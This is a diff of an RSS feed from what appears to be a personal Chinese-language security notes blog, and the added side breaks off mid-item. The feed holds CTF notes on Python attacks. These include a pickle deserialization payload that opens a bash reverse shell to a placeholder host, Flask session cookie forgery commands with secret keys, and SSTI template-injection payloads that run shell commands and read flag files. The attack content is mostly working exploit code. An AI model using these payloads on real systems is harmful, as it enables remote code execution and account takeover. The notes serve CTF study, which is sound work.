@@ -1,135 +1,33 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>python on Alex lan</title><link>http://localhost:1313/docs/network-security/python/</link><description>Recent content in python on Alex lan</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate><atom:link href="http://localhost:1313/docs/network-security/python/index.xml" rel="self" type="application/rss+xml"/><item><title>pickle反序列化</title><link>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-PYTHON" data-lang="PYTHON">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/python3.6&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> pickle
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> base64 &lt;span style="color:#f92672">import&lt;/span> b64encode
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User &lt;span style="color:#f92672">=&lt;/span> type(&lt;span style="color:#e6db74">&amp;#39;User&amp;#39;&lt;/span>, (object,), {
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;uname&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;test&amp;#39;&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;is_admin&amp;#39;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;__repr__&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">lambda&lt;/span> o: o&lt;span style="color:#f92672">.&lt;/span>uname,
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;__reduce__&amp;#39;&lt;/span>: &lt;span style="color:#66d9ef">lambda&lt;/span> o: (os&lt;span style="color:#f92672">.&lt;/span>system,(&lt;span style="color:#e6db74">&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/7777 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span>,))
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>u &lt;span style="color:#f92672">=&lt;/span> pickle&lt;span style="color:#f92672">.&lt;/span>dumps(User())
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(b64encode(u)&lt;span style="color:#f92672">.&lt;/span>decode())
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>python session伪造</title><link>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</guid><description>&lt;ol>
-&lt;li>
-&lt;h2 id="session伪造">
- session伪造
- &lt;a class="anchor" href="#session%e4%bc%aa%e9%80%a0">#&lt;/a>
-&lt;/h2>
-&lt;p>获取SECRET_KEY，一般存放在环境变量中，可通过evs查看，在靶场中可注意查看robots.txt或者通过注入{{config}}查看&lt;/p>
-&lt;p>&lt;a href="https://github.com/noraj/flask-session-cookie-manager">noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)&lt;/a>&lt;/p>
-&lt;p>注意python2和python3生成的是不一样的，win和linux好像也不一样&lt;/p>
-&lt;p>在encode时注意包裹要用双引号&lt;/p>
-&lt;p>在encode时，要注意是否包含True 或者False 在python要首字母大写，不要写错了&lt;/p>
-&lt;p>&lt;del>Ture&lt;/del> =&amp;gt;True&lt;/p>
-&lt;p>&lt;del>Flase&lt;/del> =&amp;gt;False&lt;/p>
-&lt;p>注意看到key后面的符号有些时候会没有复制到，如！&lt;/p>
-&lt;pre tabindex="0">&lt;code>__import__(\&amp;#34;os\&amp;#34;).popen(\&amp;#34;cat flag.txt\&amp;#34;).read()
-&lt;/code>&lt;/pre>&lt;ul>
-&lt;li>
-&lt;p>​	encode&lt;/p>
-&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s &amp;#39;.{y]tR&amp;amp;sp&amp;amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&amp;#39; -t &amp;#39;{&amp;#34;number&amp;#34;:&amp;#34;326410031505&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;}&amp;#39;
-&lt;/code>&lt;/pre>&lt;/li>
-&lt;li>
-&lt;p>decode&lt;/p>
-&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py decode -c &amp;#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoieWVhciJ9.u96oSxNl0euw-9FpcndeiWMoHfMHx55nfrpF8VcpzA8&amp;#39; -s &amp;#39;you-will-never-guess&amp;#39;
-&lt;/code>&lt;/pre>&lt;p>没有key就直接-c,但是修改了再加密回去需要知道key才行&lt;/p>
-&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;li>
-&lt;h2 id="签名伪造">
- 签名伪造
- &lt;a class="anchor" href="#%e7%ad%be%e5%90%8d%e4%bc%aa%e9%80%a0">#&lt;/a>
-&lt;/h2>
-&lt;pre tabindex="0">&lt;code>from flask import Flask
-from flask.sessions import SecureCookieSessionInterface
-
-app = Flask(__name__)
-app.secret_key = b&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;
-
-session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
-
-@app.route(&amp;#39;/&amp;#39;)
-def index():
- print(session_serializer.dumps(&amp;#34;admin&amp;#34;))
-
-index()
-&lt;/code>&lt;/pre>&lt;/li>
-&lt;li>
-&lt;h2 id="pid伪造">
- PID伪造
- &lt;a class="anchor" href="#pid%e4%bc%aa%e9%80%a0">#&lt;/a>
-&lt;/h2>
-&lt;/li>
-&lt;/ol>
-&lt;p>有key，&lt;/p>
-&lt;p>mac地址:c2:e8:f4:f8:4f:18&lt;/p>
-&lt;pre tabindex="0">&lt;code>cat /sys/class/net/eth0/address
-&lt;/code>&lt;/pre>&lt;p>mac地址路径，cookie伪造：https://github.com/noraj/flask-session-cookie-manager&lt;/p></description></item><item><title>SSTI模板注入</title><link>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link><pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate><guid>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid><description>&lt;p>SSTI模板注入&lt;/p>
-&lt;p>&lt;a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python">SSTI (Server Side Template Injection) - HackTricks&lt;/a>&lt;/p>
-&lt;pre tabindex="0">&lt;code>__class__
-查看对象所在的类
-__base__
-查看一个类的父类
-__mro__
-返回包含回溯一个类所有由继承过父类的元组
-__subclasses__()
-返回一个类的所有子类的列表
-__builtins__
-内置模块的一个引用
-__init__,__enter__
-类实例化出一个对象时进行初始化方法
-__globals__
-返回一个函数所在的空间的所有类,属性,子模块以及方法的字典
-__dict__
-返回包含一个模块所拥有的类,属性,子模块以及方法的字典
-__getattribute__
-这个魔术方法可以拦截对对象的所有访问企图，但也具有访问对象的功能
-&lt;/code>&lt;/pre>&lt;h3 id="ssti一般流程">
- ssti一般流程
- &lt;a class="anchor" href="#ssti%e4%b8%80%e8%88%ac%e6%b5%81%e7%a8%8b">#&lt;/a>
-&lt;/h3>
-&lt;p>尝试读取&lt;/p>
-&lt;pre tabindex="0">&lt;code>{{config}}
-{{self}}
-__class__.__init__.__globals__[app].config
-&lt;/code>&lt;/pre>&lt;p>python2/3&lt;/p>
-&lt;pre tabindex="0">&lt;code>python2
-	&amp;#39;&amp;#39;.__class__.__mro__[2]
-	&amp;#39;&amp;#39;.__class__.__base__.__base__
-python3
-	&amp;#39;&amp;#39;.__class__.__mro__[1]
-	&amp;#39;&amp;#39;.__class__.__base__.
-	
-&lt;/code>&lt;/pre>&lt;p>获取所有子类&lt;/p>
-&lt;pre tabindex="0">&lt;code>&amp;#39;&amp;#39;.__class__.base__[0].__subclasses__()
-查找有用的子类
-&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__
-&lt;/code>&lt;/pre>&lt;p>通过__globals__&lt;/p>
-&lt;pre tabindex="0">&lt;code>&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__
-调用内置库的函数用builtins,调用模块用import载入
-&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval
-&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()
-或者用eval导入os模块
-&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()
-().__class__.__base__.__subclasses__()[213].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#39;env&amp;#39;).read()
-&lt;/code>&lt;/pre>&lt;p>别骂了，我太菜了&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>{{lipsum&lt;span style="color:#f92672">.&lt;/span>__globals__&lt;span style="color:#f92672">.&lt;/span>os&lt;span style="color:#f92672">.&lt;/span>popen(&lt;span style="color:#e6db74">&amp;#39;cat flag.txt&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()}}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>()&lt;span style="color:#f92672">.&lt;/span>__class__&lt;span style="color:#f92672">.&lt;/span>__bases__[&lt;span style="color:#ae81ff">0&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>__subclasses__()[&lt;span style="color:#ae81ff">177&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>__init__&lt;span style="color:#f92672">.&lt;/span>__globals__&lt;span style="color:#f92672">.&lt;/span>__builtins__[&lt;span style="color:#e6db74">&amp;#39;eval&amp;#39;&lt;/span>](&lt;span style="color:#e6db74">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;&lt;/span>)
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>过滤字符串，用字符拼接的方式&lt;/p>
-&lt;p>config&lt;/p>
-&lt;pre tabindex="0">&lt;code>__class__.__init__.__globals__[app].config
-&lt;/code>&lt;/pre>&lt;p>没有内置os模块的&lt;/p>
-&lt;pre tabindex="0">&lt;code>{{[].__class__.__base__.__subclasses__()[59].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;__builtins__&amp;#39;][&amp;#39;eval&amp;#39;](&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls&amp;#39;).read()&amp;#34;)}}
-&lt;/code>&lt;/pre>&lt;p>有内置os模块的&lt;/p>
-&lt;pre tabindex="0">&lt;code>{{[].__class__.__base__.__subclasses__()[71].__init__[&amp;#39;__glo&amp;#39;+&amp;#39;bals__&amp;#39;][&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
-&lt;/code>&lt;/pre>&lt;p>懒得找模块就直接bp遍历一波&lt;/p>
-&lt;pre tabindex="0">&lt;code>{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
-&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls /&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;catch_warnings&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag.txt&amp;#39;).read()&amp;#34;)}}{% endif %}{% endfor %}
-&lt;/code>&lt;/pre>&lt;p>过滤参考网上大把&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>python on Alex lan</title>
+    <link>http://localhost:1313/docs/network-security/python/</link>
+    <description>Recent content in python on Alex lan</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Sun, 08 Dec 2024 14:03:24 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/docs/network-security/python/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>pickle反序列化</title>
+      <link>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/python/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-PYTHON&#34; data-lang=&#34;PYTHON&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3.6&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pickle&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; base64 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; b64encode&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; type(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User&amp;#39;&lt;/span&gt;, (object,), {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uname&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_admin&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__repr__&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; o: o&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;uname,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__reduce__&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; o: (os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system,(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/7777 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span&gt;,))&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;})&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(User())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(b64encode(u)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>python session伪造</title>
+      <link>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/python/python-session%E4%BC%AA%E9%80%A0/</guid>
+      <description>&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;h2 id=&#34;session伪造&#34;&gt;&#xD;&#xA;  session伪造&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#session%e4%bc%aa%e9%80%a0&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;p&gt;获取SECRET_KEY，一般存放在环境变量中，可通过evs查看，在靶场中可注意查看robots.txt或者通过注入{{config}}查看&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/noraj/flask-session-cookie-manager&#34;&gt;noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;注意python2和python3生成的是不一样的，win和linux好像也不一样&lt;/p&gt;&#xA;&lt;p&gt;在encode时注意包裹要用双引号&lt;/p&gt;&#xA;&lt;p&gt;在encode时，要注意是否包含True 或者False 在python要首字母大写，不要写错了&lt;/p&gt;&#xA;&lt;p&gt;&lt;del&gt;Ture&lt;/del&gt;      =&amp;gt;True&lt;/p&gt;&#xA;&lt;p&gt;&lt;del&gt;Flase&lt;/del&gt;     =&amp;gt;False&lt;/p&gt;&#xA;&lt;p&gt;注意看到key后面的符号有些时候会没有复制到，如！&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__import__(\&amp;#34;os\&amp;#34;).popen(\&amp;#34;cat flag.txt\&amp;#34;).read()&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;​&#x9;encode&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 flask_session_cookie_manager3.py encode -s &amp;#39;.{y]tR&amp;amp;sp&amp;amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d&amp;#39; -t &amp;#39;{&amp;#34;number&amp;#34;:&amp;#34;326410031505&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;}&amp;#39;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;decode&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 flask_session_cookie_manager3.py decode -c &amp;#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoieWVhciJ9.u96oSxNl0euw-9FpcndeiWMoHfMHx55nfrpF8VcpzA8&amp;#39; -s &amp;#39;you-will-never-guess&amp;#39;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没有key就直接-c,但是修改了再加密回去需要知道key才行&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;h2 id=&#34;签名伪造&#34;&gt;&#xD;&#xA;  签名伪造&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#%e7%ad%be%e5%90%8d%e4%bc%aa%e9%80%a0&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from flask import Flask&#xA;from flask.sessions import SecureCookieSessionInterface&#xA;&#xA;app = Flask(__name__)&#xA;app.secret_key = b&amp;#39;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;amp;&amp;amp;_ej$tez)$_ik36n8d7o6mr#y&amp;#39;&#xA;&#xA;session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)&#xA;&#xA;@app.route(&amp;#39;/&amp;#39;)&#xA;def index():&#xA;    print(session_serializer.dumps(&amp;#34;admin&amp;#34;))&#xA;&#xA;index()&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;h2 id=&#34;pid伪造&#34;&gt;&#xD;&#xA;  PID伪造&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#pid%e4%bc%aa%e9%80%a0&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;有key，&lt;/p&gt;&#xA;&lt;p&gt;mac地址:c2:e8:f4:f8:4f:18&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat /sys/class/net/eth0/address&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;mac地址路径，cookie伪造：https://github.com/noraj/flask-session-cookie-manager&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>SSTI模板注入</title>
+      <link>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/network-security/python/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
+      <description>&lt;p&gt;SSTI模板注入&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python&#34;&gt;SSTI (Server Side Template Injection) - HackTricks&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;__class__&#xA;查看对象所在的类&#xA;__base__&#xA;查看一个类的父类&#xA;__mro__&#xA;返回包含回溯一个类所有由继承过父类的元组&#xA;__subclasses__()&#xA;返回一个类的所有子类的列表&#xA;__builtins__&#xA;内置模块的一个引用&#xA;__init__,__enter__&#xA;类实例化出一个对象时进行初始化方法&#xA;__globals__&#xA;返回一个函数所在的空间的所有类,属性,子模块以及方法的字典&#xA;__dict__&#xA;返回包含一个模块所拥有的类,属性,子模块以及方法的字典&#xA;__getattribute__&#xA;这个魔术方法可以拦截对对象的所有访问企图，但也具有访问对象的功能&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ssti一般流程&#34;&gt;&#xD;&#xA;  ssti一般流程&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#ssti%e4%b8%80%e8%88%ac%e6%b5%81%e7%a8%8b&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&#xD;&#xA;&lt;p&gt;尝试读取&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{{config}}&#xA;{{self}}&#xA;__class__.__init__.__globals__[app].config&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;python2/3&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python2&#xA;&#x9;&amp;#39;&amp;#39;.__class__.__mro__[2]&#xA;&#x9;&amp;#39;&amp;#39;.__class__.__base__.__base__&#xA;python3&#xA;&#x9;&amp;#39;&amp;#39;.__class__.__mro__[1]&#xA;&#x9;&amp;#39;&amp;#39;.__class__.__base__.&#xA;&#x9;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取所有子类&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39;&amp;#39;.__class__.base__[0].__subclasses__()&#xA;查找有用的子类&#xA;&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过__globals__&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__&#xA;调用内置库的函数用builtins,调用模块用import载入&#xA;&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval&#xA;&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()&#xA;或者用eval导入os模块&#xA;&amp;#39;&amp;#39;.__class__.__mro__[-1].__subclasses__()[100].__init__.__globals__.__builtins__.eval.__import__(&amp;#39;os&amp;#39;).popen(&amp;#34;ls&amp;#34;).read()&#xA;().__class__.__base__.__subclasses__()[213].__init__.__globals__[&amp;#39;popen&amp;#39;](&amp;#39;env&amp;#39;).read()&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;别骂了，我太菜了&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{{lipsum&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__globals__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;popen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cat flag.txt&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()}}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__class__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__bases__[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__subclasses__()[&lt;span style=&#34;color:#ae81ff&#34;&gt;177&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__init__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__globals__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__builtins__[&lt;span 